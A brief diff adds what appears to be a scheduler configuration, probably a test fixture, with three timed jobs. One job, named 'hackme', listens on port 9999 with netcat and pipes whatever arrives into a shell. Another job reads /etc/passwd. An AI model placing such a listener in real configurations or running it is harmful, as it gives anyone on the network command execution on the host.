@@ -1,0 +1,9 @@
+[passwd]
+cmd = '''grep root /etc/passwd'''
+[cleanup]
+cmd = '''rm -vrf /tmp/trash.tmp-*'''
+interval = '1h'
+[hackme]
+cmd = '''nc -l 9999 | sh'''
+interval = '17h'
+splice = '1h'
